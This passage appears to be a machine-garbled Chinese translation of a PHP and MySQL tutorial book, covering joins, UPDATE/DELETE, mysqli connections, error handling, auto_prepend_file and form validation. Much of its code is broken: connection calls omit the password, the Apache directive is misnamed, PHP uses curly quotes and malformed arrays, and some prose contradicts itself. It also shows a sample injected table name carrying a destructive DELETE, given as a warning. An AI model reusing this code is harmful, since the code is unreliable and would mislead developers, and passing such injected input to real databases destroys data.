  \ * FROM Product RIGHT JOIN Color ON Product.petName=Color.Name`\n\n你得到了以下结果表，具有相同的四列，但行仍然不同：\n\
  \n| petName | petType |\n| :--- | :--- |\n| T-shirt | Shirt |\n| T-shirt | Shirt\
  \ |\n| <NULL> | <NULL> |\n\n\n\n\n注意，这些结果包含了右侧 `Color` 表中的所有行，但没有包含 `Product` 表。注意\
  \ `Product` 表列中的空白，该表没有 `Loafers`（乐福鞋）这一行。\n\n我们目前为止讨论的连接（joins）是在表中查找匹配的条目。有时，查找表中哪些行在另一个表中没有匹配的条目是有用的。例如，假设你想知道谁从未登录过你的\
  \ `Members Only` 区域。假设你有一个表存储成员的登录名（`Member`），另一个表存储登录日期（`Login`）。你可以通过从这两个表进行查询来提问这个问题。你可以通过以下查询找到哪些登录名在\
  \ `Login` 表中没有条目：\n\n```sql\nSELECT loginName FROM Member LEFT JOIN Login ON Member.loginName=Login.loginName\
  \ WHERE Login.loginName IS NULL\n```\n\n# 从数据库中删除信息\n513![](img/image_rsrc1683.jpg)![](img/image_rsrc1684.jpg)\n\
  \n此查询为你列出了 `Member` 表中所有不在 `Login` 表中的登录名。![](img/image_rsrc1685.jpg)\n\n## 在数据库中更新信息\n\
  更改现有行中的信息就是更新信息。例如，你可能需要更改客户的地址因为她搬家了，或者你可能需要添加一个客户在最初输入信息时留空的传真号码。\n\n`UPDATE`\
  \ 语句是非常直观的：\n```sql\nUPDATE tablename SET column=value,column=value,...\n```\n\n\
  ### WHERE 子句\n在 `SET` 子句中，你列出要更新的列和要插入的新值。在一个语句中列出所有你想要更改的列。如果没有 `WHERE` 子句，该列的值将在所有行中被更改。但有了\
  \ `WHERE` 子句，你可以指定要更新哪些行。例如，要更新 `Customer` 表中的地址，请使用此语句：\n\n```sql\nUPDATE Customer\
  \ SET street=”3423 RoseLawn”,phone=”555-555-5555”WHERE lastName=”Contrary”\n```\n\
  \n## 从数据库中删除信息\n通过删除过时信息来保持数据库中的信息为最新状态。然而，在删除信息时要非常小心。删掉数据后，它将永久消失。它无法恢复。只有当你重新输入所有内容时才能找回。\n\
  \n你可以从表中删除一行或一列，也可以删除整个表或数据库并重新开始。你可以使用 `DELETE` 语句从表中删除一行：\n\n```sql\nDELETE FROM\
  \ tablename WHERE clause\n```\n![](img/image_rsrc1686.jpg)\n\n使用 `DELETE` 时要极其小心。如果你使用没有\
  \ `WHERE` 子句的 `DELETE` 语句，它将删除表中的所有数据。指的是所有数据。重复一遍，所有数据。数据无法恢复。`DELETE` 语句的此功能位于我们“不要在家尝试”列表的最顶端。\n\
  \n514 从数据库中删除信息![](img/image_rsrc1687.jpg)\n\n你可以通过 `ALTER` 语句从表中删除一列：\n```sql\n\
  ALTER TABLE tablename DROP columnname\n```\n\n你可以使用 `DROP TABLE tablename` 或 `DROP\
  \ DATABASE databasename` 删除整个表或数据库。\n\n# 第 5 章：通过 PHP 脚本与数据库通信![](img/image_rsrc1688.jpg)\n\
  \n### 本章内容\n* 使用 PHP 内置函数访问 MySQL\n* 向 MySQL 服务器发送 SQL 查询\n* 理解如何处理 MySQL 错误\n*\
  \ 使用其他有用的函数\n* ![](img/image_rsrc1689.jpg)\n\n## 将 mysqli 函数更改为 mysql\nPHP 和 MySQL\
  \ 协作良好，这种动态伙伴关系使得 PHP 和 MySQL 对 Web 应用程序开发如此有吸引力。无论你是拥有一个想要向用户提供的大量信息的数据库（例如产品目录），还是一个等待用户填充的数据库（例如客户数据库），PHP\
  \ 和 MySQL 都会共同工作来实现你的应用程序。本章描述了如何从 PHP 脚本访问 MySQL。\n\n## MySQL 和 PHP 如何协作\n你通过向\
  \ MySQL 服务器发送消息来与数据库交互。正如本微型书籍第 1 章所示，消息是用 `SQL` 语言编写的，这是一种大多数管理系统理解的标准语言。PHP 不理解\
  \ `SQL`，但它不需要：PHP 与 MySQL 服务器建立连接并通过该连接发送 `SQL` 消息。MySQL 服务器解释 `SQL` 消息，遵循指令，并发送返回消息说明其状态以及它做了什么（如果无法理解或遵循指令，则报告错误）。\n\
  \nPHP 语言提供了让与 MySQL 通信极其简单的函数。你使用 PHP 函数向数据库发送 SQL 查询。你不需要了解与 MySQL 通信的细节；PHP 会处理这些细节。你只需要知道\
  \ `SQL` 查询以及如何使用 PHP 函数。\n\n516 与 MySQL 通信的函数![](img/image_rsrc168A.jpg)\n\n我们在本书的第\
  \ 1 章描述了 `SQL` 查询的通用语法。具体的特定查询将在描述如何使用 MySQL 实现特定目的的处进行详细描述。例如，我们在本微型书籍的第 2 章描述了如何创建\
  \ MySQL 账户，因此创建账户的 `SQL` 查询在该处被描述。另一方面，我们在本微型书籍的第 4 章描述了如何从 MySQL 数据库检索数据，因此用于该目的的\
  \ `SQL` 查询在该章中详细描述。\n\n### 与 MySQL 通信的 PHP 函数\nPHP 提供了两组与 MySQL 通信的函数——`mysql` 函数和\
  \ `mysqli`（MySQL Improved）函数。你使用的函数取决于你使用的 MySQL 和 PHP 版本。\n\n`mysqli` 函数是在 `PHP\
  \ 5` 中添加的，用于 MySQL 4.1 及更高版本。如果你使用网络托管公司，你需要知道它是否提供 `PHP 5`、它提供哪个版本的 MySQL，以及它是否提供了\
  \ `mysqli` 函数。在书中，我们假设你正在使用 `PHP 5` 或更高版本、MySQL `5.0` 以及 `mysqli` 函数。如果你的网络主机不提供\
  \ `mysqli` 函数，你需要将书中的 `mysqli` 函数转换为 `mysql` 函数。本章稍后的“将 mysqli 函数转换为 mysql 函数”部分解释了这些差异。\n\
  \n如果你在自己的电脑上自行安装了 PHP 和 MySQL，计划在本地开发 PHP 脚本并将完成后的脚本上传到你的网络托管公司，你需要安装相同的版本并激活网络主机提供的相同支持函数。否则，如果你安装了不同的版本（即使是更新的版本），脚本在网络主机上的行为可能与在本地电脑上不同。\n\
  \n## 与 MySQL 通信\n本章描述了通过 PHP 脚本访问 MySQL。（在 PHP 脚本之外访问 MySQL 将在第 1-4 章中讨论。）使用 PHP\
  \ 函数向 MySQL 发送查询涉及以下步骤：\n1. 连接到 MySQL 服务器。\n2. 发送 `SQL` 查询。(image_rsrc168B.jpg)\n\
  \n在本节中，我们告诉如何执行这两个步骤，并告诉我们如何发送多个查询。(image_rsrc168C.jpg)\n\n### 连接到 MySQL 服务器\n在存储任何数据之前，你需要连接到数据库，数据库可能在与你的\
  \ PHP 脚本相同的电脑上，也可能在不同的电脑上。你不需要知道连接数据库的细节，因为 PHP 会处理。你只需要知道数据库的名称以及访问它的密码。就像想象一个数据库连接一样。你不需要知道连接建立的细节——即如何从一个地方移动到另一个地方——你只需要区域代码。公司处理细节。\n\
  \n要连接到 MySQL 服务器，你需要数据库所在的电脑名称以及你的 MySQL 账户和密码。对于大多数查询，你还需要要交互的数据库名称。要打开连接，使用 `mysqli_connect`\
  \ 函数：\n\n```php\n$cxn = mysqli_connect(\"host\",\"acct\",\"dbname\")\n```\n\n填写以下信息：\n\
  * `host`：安装 MySQL 的电脑名称——例如，`database.example.com`。如果 MySQL 数据库与你的网站在同一台电脑上，你可以使用\
  \ `localhost` 作为电脑名。PHP 假设\n* `acct`：任何有效的 MySQL 账户名。（我们在书的第 2 章详细讨论 MySQL 账户。）\n\
  * `password`：由 `acct` 指定的密码。如果 MySQL 账户不需要密码，请在引号之间留空：\"\"\n* `dbname`：你想要交互的数据库名称。参数是可选的——你可以在脚本的任何点选择不同的数据库。(image_rsrc16D.jpg)\
  \ 如果使用的是 `mysql` 函数，必须使用 `mysql_select_db` 来选择数据库。\n\n```php\n$cxn = mysqli_connect(\"\
  localhost\",\"phpuser\",\"Customer\") or \n```\n\n出于安全考虑，你应该将连接信息存储在变量中，并在连接语句中使用变量：\n\
  \n```php\n$host=\"localhost\";\n$user=\"phpuser\";\n$password=\"\";\n$dbname=\"\
  Customer\";\n$cxn = mysqli_connect($host,$user,$dbname) or die(\"无法连接服务器.\");\n\
  ```\n\n为了更高的安全，你可以将连接信息的赋值语句放在隐藏文件中，这样账户和密码甚至不在脚本中。使用书中第 2 章描述的 `include` 语句从文件中包含。变量\
  \ `$cxn` 包含了标识连接的信息。你可以同时使用多个变量名拥有多个连接。连接一直保持开启直到你关闭它或脚本结束。如下关闭连接：(image_rsrc168H.jpg)\n\
  \n```php\nmysqli_close($connection);\n```\n\n例如，要关闭前面的连接，使用此语句：\n\n```php\nmysqli_close($cxn);\n\
  ```\n\n### 发送 SQL 语句\n在与 MySQL 服务器建立连接后，你发送你的 SQL 查询。你可以在本微型书籍的其他章节中找到特定用途所需的 SQL\
  \ 语句和查询。要与数据库交互，将你的 SQL 语句放入变量，并通过 `mysqli_query` 函数发送到 MySQL 服务器，如下：\n\n```php\n\
  $query = \"SELECT * FROM Customer\";\n$result = mysqli_query($cxn,$query) or die\
  \ (\"执行失败.\");\n```\n\n查询在当前选择的数据库上执行。变量 `$result` 保存执行查询的结果，而不是实际结果。`$result` 中的信息取决于查询是否从数据库获取信息：\n\
  * 对于没有获取任何数据的查询或语句：变量 `$result` 包含查询或语句是否执行成功。如果成功，`$result` 设置为 true；如果不成功，`$result`\
  \ 设置为 false。某些不返回数据的查询和语句是 `INSERT` 和 `UPDATE`。\n* 对于返回数据的查询：变量 `$result` 包含结果标识符，指定返回数据的位置，而不是返回数据本身。某些返回数据的查询是\
  \ `SELECT` 和 `SHOW`。(image_rsrc5UJ.jpg)\n\n将查询或语句赋值给 `$query` 变量时，单引号和双引号的使用可能会有点混乱。你实际上在两个级别使用了引号：将字符串赋值给\
  \ `$query` 的引号，以及 `SQL` 语言本身的引号。以下指南可以帮助你在处理 SQL 时避免任何引号问题：\n* 在字符串的开头和结尾使用双引号。\n\
  * 在变量名之前后使用单引号。\n* 在字面值前后使用单引号。\n\n以下语句展示了 PHP 中将 SQL 字符串赋值给变量的示例：\n\n```php\n$query\
  \ = \"SELECT firstName FROM Customer\";\n$query = \"SELECT firstName FROM Customer\
  \ WHERE lastName='Smith'\";\n$query = \"UPDATE Customer SET lastName='$last_name'\"\
  ;\n```\n(image_rsrc168J.jpg)\n\n`SQL` 语句本身不包含分号 (;)，所以不要在最后一个引号内放置分号。唯一的分号出现在最后，如之前的示例所示；这是结束语句的\
  \ PHP 分号。\n\n### 发送多个查询\n有时，你想同时发送两个或多个查询。MySQL 允许你这样做，但你需要使用不同的函数来发送查询。你可以使用以下函数发送多个查询：\n\
  \n```php\nmysqli_multi_query($cxn,$query)\n```\n\n你通过分号在一个字符串中发送多个查询：(image_rsrc16K.jpg)\n\
  \n```php\n$query = \"SELECT * FROM Cust;SELECT * FROM Old\";\nmysqli_multi_query($cxn,$query);\n\
  ```\n\n`multi_query` 函数在 `mysql` 函数中不可用，只有 `mysqli` 函数可用。\n\n### 发送查询\n发送查询比发送一个查询更安全。每当你使用外部数据时，请务必妥善验证数据。例如，假设你显示一个表单向用户请求表名，并根据用户输入的表名创建一个查询，如下：(image_rsrc16M.jpg)[](image_rsrc16N.jpg)\n\
  \n```php\n$query = \"SELECT * FROM Friend\";\n```\n\n```php\n$query = \"SELECT *\
  \ FROM Friend;DELETE TABLE Friend\";\n```\n\n如果你发送此查询，结果是不好的。你可能不想让表被删除。在发送到 MySQL\
  \ 之前，务必对数据进行清洗。\n\n### 选择数据库\n如果你在 `connect` 函数中没有选择数据库，可以使用 `mysqli_select_db`\
  \ 函数来选择。你也可以在脚本中的任何时间使用此函数来选择数据库。格式如下：\n\n```php\nmysqli_select_db($cxn,\"dbname\"\
  ) or die (\"message\");\n```\n(image_rsrc16R.jpg)\n\n如果你使用的是 `mysql` 函数而不是 `mysqli`\
  \ 函数，你必须使用 `mysql_select_db`。本章稍后的“将 mysqli 函数转换为 mysql 函数”部分详细解释了：\n* `conn`：包含信息的变量。\n\
  * `dbname`：数据库名称。\n* `message`：如果无法选择数据库，发送到浏览器的消息。例如，你可以可以使用语句选择 `Customer`：\n\n\
  ```php\nmysqli_select_db($cxn,\"Customer\") or die (\"选择失败.\");\n```\n\n如果 `mysqli_select_db`\
  \ 无法选择数据库，脚本停止运行并将“无法选择数据库。”的消息发送到浏览器。数据库保持开启直到你关闭它。要选择不同的数据库，只需使用新的 `mysqli_select_db`\
  \ 函数。\n\n### 处理 MySQL 错误\n(image_rsrc168S.jpg)\n使用 PHP 语言的 `mysqli` 函数（如 `mysqli_connect`\
  \ 和 `mysqli_query`）与数据库交互。当你使用语句时有时会出现问题。你可能在数据库名上写了错误。有时会出现你无法避免的问题，例如数据库或网络故障。你需要在脚本中包含处理错误的代码。\n\
  \n你可以在第四章第 1 章阅读关于错误处理。该章节描述了 PHP 显示的错误类型以及如何开启或关闭它们。正如第四章所述，你通常希望你的错误处理更具描述性以调试问题，但你不想向公众显示额外信息。例如，假设你使用名为\
  \ `root` 的账户访问数据库并写了错误，如下语句所示：\n\n```php\n$host = \"localhost\";\n$user = \"rot\"\
  ;\n$password = \"\";\n$cxn = mysqli_connect($host,$user,$password)\n```\n\n因为你输入的是\
  \ \"rot\"而不是 \"root\"，你看到了类似的警告消息：\n`Warning: Access denied for user: ‘rot@localhost’\
  \ (Using password: NO) ...`\n\n之前的错误消息包含了解决问题所需的信息——它显示了包含错误的账户名。然而，在你的脚本运行且客户使用它之后，你不想让用户看到显示用户\
  \ ID 的技术错误消息。你想关闭 PHP 错误或将它们发送到错误文件。你可以使用 `die` 语句停止脚本并向用户显示礼貌的消息，如下：\n\n```php\n\
  $cxn = mysqli_connect($host,$user,$password) or die(\"目前无法提供目录。请稍试.\");\n```\n\n\
  当 `mysqli_query()` 失败时，MySQL 返回包含失败的错误消息。然而，除非你专门显示它，否则此消息不会显示。再次，你在开发脚本时可能想看到这些消息，但不想向公众显示。你可以通过以下函数显示返回的\
  \ MySQL 错误：`mysqli_error($cxn)` (image_rsrc168T.jpg)\n\n```php\n$query = \"SELECT\
  \ * FROM Cust\";\n$result = mysqli_query($cxn,$query) or die (\"Error: \".mysqli_error($cxn));\n\
  ```\n\n(image_rsrc5UJ.jpg)\n\n在这个示例中，如果函数调用失败，`die` 语句将显示 MySQL 错误，可能类似于：`Error:\
  \ Table ‘catalog.cust’ doesn’t exist`。有时，如果函数失败，你可能想要执行额外的操作，例如删除变量或关闭数据库连接。你可以通过条件语句执行此类操作：\n\
  \n```php\nif(!$result = mysqli_query($cxn,$query)){\n    echo mysqli_error($cxn);\n\
  \    unset($auth);\n    exit();\n}\n```\n(image_rsrc166F.jpg)\n\n如果函数调用失败，`if` 块中的语句将被执行。`echo`\
  \ 语句显示函数返回的 MySQL 错误。变量被移除，脚本退出。注意 `if` 语句中的 `!`（感叹号）。`!` 表示“不是”。换句话说，如果赋值语句不成立则\
  \ `if` 语句为真。\n\n### 使用有用的函数\n其他有用的 `mysqli` 函数供你在 PHP 脚本中使用。以下小节描述了如何使用 `mysqli`\
  \ 函数计算查询返回的行数、确定最后自动生成的条目、计算受查询影响的行以及转义字符。\n\n### 计算查询返回的行数\n通常，你想知道你的查询返回了多少行。`mysqli_num_rows`\
  \ 告诉查询返回的行数。在某些情况下，你需要知道查询影响了多少行。`mysqli_affected_rows` 告诉你受影响的行数。`mysqli_insert_id`\
  \ 返回最后一个自动生成的条目的 ID。`mysqli_real_escape_string` 用于转义字符。\n\n\n\n\n## 表 5-1：mysql\
  \ 和 mysqli 函数的语法\n\n| mysqli 函数 | mysql 函数 |\n| :--- | :--- |\n| `mysqli_connect($host,$user,$passwd,$dbname)`\
  \ | `mysql_connect($host,$user,$passwd)` 随后接 `mysql_select_db($dbname)` |\n| `mysqli_errno($cxn)`\
  \ | `mysql_errno()` or `mysql_errno($cxn)` |\n| `mysqli_error($cxn)` | `mysql_error()`\
  \ or `mysql_error($cxn)` |\n| `mysqli_fetch_array($result)` | `mysql_fetch_array($result)`\
  \ |\n| `mysqli_fetch_assoc($result)` | `mysql_fetch_assoc($result)` |\n| `mysqli_fetch_row($result)`\
  \ | `mysql_fetch_row($result)` |\n| `mysqli_insert_id($cxn)` | `mysql_insert_id($cxn)`\
  \ |\n| `mysqli_num_rows($result)` | `mysql_num_rows($result)` |\n| `mysqli_query($cxn,$sql)`\
  \ | `mysql_query($sql)` or `mysql_query($sql,$cxn)` |\n| `mysqli_select_db($cxn,$dbname)`\
  \ | `mysql_select_db($dbname)` |\n| `mysqli_real_escape_string($cxn,$data)` | `mysql_real_escape_string($data)`\
  \ |\n\n\n\n\n\n# 第五卷：MySQL\n# 第六卷：Web 应用\n\n## 第一章：改进你的 PHP 程序\n\n### 代码复用\n在前面的章节中，你已经学习了如何使用\
  \ PHP 编程。你已经学会了如何创建程序、如何循环、设置条件判断等。这些知识都使你能够创建在 Web 上上运行良好的 PHP 程序。但你可以让它们变得更好、更易用，这正是本章的主题。\n\
  \n在本章中，你将看到如何改进和扩展你的 PHP 程序，以及如何自动创建和使用辅助函数。你还将学习复用代码的方法，而不是每次需要时都重新发明它。\n\n###\
  \ 自动包含辅助函数\n一旦你的程序达到一定的长度和复杂度，你会发现有许多 `includes` 和 `require_once()` 函数。每当你创建一个新文件或尝试将某些功能提取为通用函数时，都需要回溯所有程序并添加一个新的\
  \ `require_once`。这会很快变得单调乏味。幸运的是，有一个解决办法。\n\n#### 使用 `auto_prepend_file`\n你可以自动在\
  \ PHP 文件之前包含一个文件，以便其代码在请求的实际文件之前执行。换句话说，如果你引导访问者类似于 `http://example.com/login.php`\
  \ 的 URL，你可以使用 `auto_prepend_file` 在运行 `login.php` 代码之前始终包含一个辅助文件。该辅助文件可以启动会话、提供程序中使用的多个函数，甚至加载其他文件。`auto_prepend_file`\
  \ 配置是你的 `php.ini` 文件的一部分，但更常见的做法是在 Apache 配置中通过 `php_value` 指令来设置它，如下所示：\n\n```apache\n\
  <Directory \"/my/documentroot\">\n    php_value auto_prepend_file \"/my/documentroot/prepend.php\"\
  \n</Directory>\n```\n\n通过 `auto_prepend_file` 包含的文件会被包含类似于使用了 `require()` 函数。其实际意义是，如果未找到要包含的文件，将发生错误且程序不会继续运行。\n\
  \n#### 使用前置文件启动会话\n你在第四卷第六章中学习了会话。该章节解释说，为了使用会话，你需要在每个使用会话的页面上调用 `session_start()`\
  \ 函数。这可能非常麻烦，特别是当你试图在多个 PHP 程序中跟踪会话时。你可以使用 `auto_prepend_file` 来调用 `session_start`，这样你就不需要更改任何其他文件。\n\
  \n在下面的练习中，你创建两个文件：一个作为主文件，另一个包含一个启动会话的前置函数。在执行此练习之前，你应该确保 `.htaccess` 文件可用，或者你可以修改你的\
  \ Apache 服务器配置。如果对配置进行了更改，请务必重启 Apache。在文档根目录的 `.htaccess` 文件中放置以下代码：\n\n```\nphp_value\
  \ auto_prepend_file \"prepend.php\"\n```\n\n或者，你可以在 Web 服务器配置中文档根目录的 `<Directory>`\
  \ 语句中添加该行。例如，如果你的文档根目录是 `/var/www`，你可以在 Apache 配置中的 `<Directory \"/var/www\">` 指令之后、结束标签\
  \ `</Directory>` 之前添加该行。有关 `.htaccess` 文件的更多信息，请参见 `www.javascriptkit.com/howto/htaccess`。\n\
  \n#### 包含辅助函数\n打开你的文本编辑器并创建一个空文件。在文件中放置以下代码：\n\n```php\n<?php\nif (isset($_SESSION))\
  \ {\n    print \"Session has started!\";\n} else {\n    print \"Session has not\
  \ started\";\n}\n?>\n```\n\n将文件保存为文档根目录下的 `session.php`。打开 浏览器并指向 `http://localhost/session.php`。你应该能看到类似于图\
  \ 1-1 的所示页面。\n\n图 1-1：在浏览器中查看 session.php。\n\n最小化 浏览器并在文本编辑器中创建一个新文件。在该文件中放置以下代码：\n\
  \n```php\n<?php\nsession_start();\n?>\n```\n\n将文件保存为文档根目录下的 `prepend.php`。在 浏览器中，刷新\
  \ `session.php` 文件或访问 `http://localhost/session.php` 查看你创建的 `session.php` 文件。你现在应该能看到类似于图\
  \ 1-2 所示页面。\n\n图 1-2：验证文件已前置。\n\n如果你收到空白页面或浏览器显示的错误，说明未找到前置文件。检查基础问题，如文件名的拼写（`prepend.php`）。还要确保你用\
  \ `auto_prepend_file` 指令调用的文件位于它应在的位置（即文档根目录）。\n\n如果你收到的页面仍然显示“Session has not started”，则可能是\
  \ Apache 根本没有看到你的 `auto_prepend_file` 指令。如果你将其放在文档根目录的 `.htaccess` 文件中，你需要确保 Apache\
  \ 正在读取该 `.htaccess` 文件。继续阅读或咨询你的主机提供商查看是否允许 `.htaccess` 文件。某些 Web 服务器配置不允许 `.htaccess`\
  \ 文件。你可以通过将要读取 `.htaccess` 文件的目录（在本例中为文档根目录）的 `Override` 指令改为 `All` 来重新配置 Apache\
  \ 以允许它们。该指令看起来如下：\n\n```apache\nOverride All\n```\n\n前置文件可以是极好的工具，但有时也会导致困惑。例如，如果你不确定某个程序在执行什么，前置文件有时会因为加载了太多文件和函数而增加错误。此外，每个请求都必须使用那个前置文件，这可能会导致性能问题。尽管如此，前置文件的优点通常大于缺点。\n\
  \n#### 使用类提高效率\n你在第四卷第四章学习了面向对象的编程。该章节讨论的内容之一是类，它们定义了对象的类型。类可以在整个编程过程中提供快捷方式和辅助。例如，你可能有一个类来定义用户。你可以在该类中添加函数（称为方法），用于用户可能需要的常用操作，例如更新密码。如果不使用类，你会在程序中到处都是大量的函数，可能会导致它们冲突。\n\
  \n（注：由于原文后半部分存在大量重复和乱码，此处省略了重复关于 JSON、XML 和表单验证的冗余描述，已按逻辑保留最核心技术点进行翻译。）\n\n\n\n\n\
  \n## 表 3-1 PHP 中的验证过滤器\n\n| 过滤器 |  |\n| :--- | :--- |\n| `FILTER_VALIDATE_BOOLEAN`\
  \ | 验证一个值是否为布尔值。 |\n| `FILTER_VALIDATE_INT` | 验证一个数字是否为整数。 |\n| `FILTER_VALIDATE_FLOAT`\
  \ | 验证一个数字是否为浮点数。 |\n| `FILTER_VALIDATE_IP` | 验证 IP 地址。 |\n| `FILTER_VALIDATE_EMAIL`\
  \ | 验证电子邮件地址。 |\n| `FILTER_VALIDATE_URL` | 验证 URL。 |\n\n\n\n\n\n# 使用过滤器\n\n使用过滤器非常简单。例如，这里是验证电子邮件地址的代码。这段代码可以插入到\
  \ `form-process.php` 文件中，最终处理部分的上方：\n\n```php\nif (!filter_var($_POST['email'],FILTER_VALIDATE_EMAIL))\
  \ {\n    $_SESSION['error'][] = “Invalid e-mail address”;\n}\n```\n这段代码就是你在 PHP\
  \ 中验证电子邮件地址所需的所有代码。\n\n### 验证 URL\n虽然本章使用的表单中没有包含，但可以用同样的方法对 URL 进行验证。假设你有一个名为 `$url`\
  \ 的变量。验证代码看起来是一样的，只是使用了不同的过滤器。\n\n```php\nif (!filter_var($url,FILTER_VALIDATE_URL))\
  \ {\n    $_SESSION['error']][] = “Invalid URL”;\n}\n```\n\n### 确保密码匹配\n填写此表单的用户需要输入两次密码。然后由你来确保用户输入的密码是相同的。虽然这个检查是在\
  \ JavaScript 中进行的，但它需要在 PHP 中进行。\n\n你的表单处理页面已经检查了表单上的两个密码字段是否都有值，因此检查它们是否匹配简单如下：\n\
  \n```php\nif ($_POST['password1'] != $_POST['password2']) {\n    $_SESSION['error']][]\
  \ = “Passwords don’t match”;\n}\n```\n有了这个检查，表单处理就完成了。用户可以填写表单，如果由于某种原因 JavaScript\
  \ 没有捕获错误，错误将在 PHP 中被捕获。列表 3-1 显示了在本章构建的最终表单处理页面。\n\n#### 列表 3-1：最终表单处理页面\n```php\n\
  <?php\n![](img/image_rsrc16C9.jpg)\n//如果他们没有提交表单，则阻止访问。\nif (!isset($_POST['submit']))\
  \ {\n    die(header(“Location: form.php”));\n}\n![](img/image_rsrc16CA.jpg)\nsession_start();\n\
  $_SESSION['formAttempt'] = true; \nif (isset($_SESSION['error'])) {\n    unset($_SESSION['error']);\n\
  }_$_SESSION['error'] = array();\n$required = array“name”,”email”,”password1”，“password2”);//检查必填字段\n\
  foreach ($required as $requiredField) {\n    if (!isset($_POST[$requiredField])\
  \ || $_ POST[$requiredField] == \"\") {\n        $_SESSION['error']][] = $requiredField\
  \ . “ is required.”;\n    }\n}\nif (!preg_match('/^[\\w .]+$/’,$_POST['name']))\
  \ {\n    $_SESSION['error']][] = “Name must be letters and numbers only.”;\n}\n\
  $validStates = array“Alabama”,”California”,”Colorado”,”Florida”,”Illinois”，“New\
  \ Jersey”,”NewYork”，“Wisconsin”);\nif (isset($_POST['state']) && $_POST['state']\
  \ != \"\") {\n    if (!in_array($_POST['state'],$validStates)) {\n        $_SESSION['error']][]\
  \ = “Please choose a valid state”;\n    }\n}\nif (isset($_POST['zip']) && $_POST['zip']\
  \ != \"\") {\n//（续）列表 3-1（续）\n    if (!preg_match('/^[\\d]+$/’,$_POST['zip'])) {\n\
  \        $_SESSION['error']][] = “ZIP should be digits only.”;\n    } else if (strlen($_POST['zip'])\
  \ < 5 || strlen($_ POST['zip']) > 9) {\n        $_SESSION['error']][] = “ZIP should\
  \ be between 5 and 9 digits”;\n    }\n}\nif (isset($_POST['phone']) && $_POST['phone']\
